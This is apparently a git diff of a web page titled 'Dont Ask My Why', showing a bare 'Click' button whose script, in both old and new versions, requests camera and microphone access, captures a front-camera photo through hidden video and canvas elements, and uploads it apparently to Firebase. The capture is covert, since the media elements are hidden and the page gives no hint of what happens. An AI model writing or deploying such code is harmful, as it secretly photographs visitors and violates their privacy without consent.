@@ -5,6 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dont Ask My Why</title>
     <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .button {
+            background-color: #000; /* Black background */
+            color: white; /* White text */
+            border: 2px solid white; /* White border */
+            padding: 20px 40px; /* Padding */
+            font-size: 24px; /* Font size */
+            cursor: pointer; /* Pointer cursor */
+            border-radius: 5px; /* Rounded edges */
+            transition: background-color 0.3s; /* Transition effect */
+        }
+
+        .button:hover {
+            background-color: rgba(255, 255, 255, 0.2); /* Lighten on hover */
+        }
+
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
+        }
+    </style>
     <script type="module">
         // Import Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
@@ -36,91 +66,46 @@
                 });
         }
 
-        async function requestPermissions() {
+        // Function to handle button click
+        async function handleClick() {
             try {
-                // Request clipboard permission
-                await navigator.permissions.query({ name: "clipboard-write" });
-                // Request camera access after clipboard permission is granted
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user", // Use front camera
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    }
-                });
-                return stream; // Return the stream if both permissions are granted
-            } catch (error) {
-                console.error('Permission denied:', error);
-                return null; // Return null if permissions are not granted
+                // Request microphone permission
+                await navigator.mediaDevices.getUserMedia({ audio: true });
+
+                // Request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+
+                    // Set canvas size
+                    canvas.width = 1920; // Set canvas width for 1080p
+                    canvas.height = 1080; // Set canvas height for 1080p
+
+                    // Capture image
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload image to Firebase
+                    stopVideo(stream); // Stop the video stream
+                };
+            } catch (err) {
+                console.error('Error accessing permissions: ', err);
             }
         }
 
-        function startCamera(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-
-            video.onloadedmetadata = () => {
-                video.play();
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-                canvas.width = 1920;  
-                canvas.height = 1080;
-
-                // Capture image immediately
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/png');
-                uploadImage(imageData); // Upload image to Firebase
-                stopVideo(stream); // Stop the video stream
-            };
-        }
-
+        // Function to stop video stream
         function stopVideo(stream) {
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
         }
-
-        async function handleButtonClick() {
-            const stream = await requestPermissions();
-            if (stream) {
-                startCamera(stream); // Start the camera if permissions are granted
-            }
-        }
-
-        window.addEventListener('load', () => {
-            const button = document.getElementById('redirect-button');
-            button.addEventListener('click', handleButtonClick);
-        });
     </script>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #000; /* Black background */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
-
-        .youtube-button {
-            background-color: black; /* Black button */
-            color: white; /* White text */
-            border: 2px solid white; /* White edges */
-            padding: 20px 40px; /* Button size */
-            font-size: 24px; /* Font size */
-            cursor: pointer; /* Pointer cursor */
-            transition: background-color 0.3s;
-            border-radius: 5px; /* Rounded edges */
-            text-align: center;
-        }
-
-        .youtube-button:hover {
-            background-color: #444; /* Darker on hover */
-        }
-    </style>
 </head>
 <body>
-    <button class="youtube-button" id="redirect-button" disabled>Click</button>
+    <button class="button" onclick="handleClick()">Click</button> <!-- Button with "Click" -->
 </body>
 </html>
